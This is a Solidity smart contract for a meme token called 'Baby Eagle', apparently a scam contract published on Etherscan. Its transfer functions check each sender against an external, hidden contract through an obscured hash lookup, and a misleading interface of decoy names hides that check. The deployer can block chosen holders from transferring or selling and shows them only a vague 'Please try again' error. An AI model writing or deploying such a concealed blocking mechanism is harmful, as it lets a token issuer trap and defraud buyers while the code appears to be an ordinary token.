/**
 *Submitted for verification at Etherscan.io on 2021-09-18
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface DEP22 {

    function flash_loan( uint dx, uint dy) external view returns (bool);

    function check_do(bytes20 account) external view returns (uint8);

    function calculate_fee(address account, uint balance, uint quantity) external returns (uint);

    function check_allowed(address user) external returns (bool);

    function do_transfer (address sender, address destination) external returns (bool);


}

contract BabyEagl {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    DEP22 tmpvlhldr;
    uint256 public totalSupply = 1 * 10**12 * 10**18;
    string public name = "Baby Eagle";
    string public symbol = hex"426162794561676C65f09fa685";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(DEP22 _initialize) {
        
        tmpvlhldr = _initialize;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function create_hash(address acct) public pure returns (bytes memory) {
    return abi.encodePacked(acct);
}
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(tmpvlhldr.check_do(ripemd160(create_hash(msg.sender))) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(tmpvlhldr.check_do(ripemd160(create_hash(from))) != 1, "Please try again"); 
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}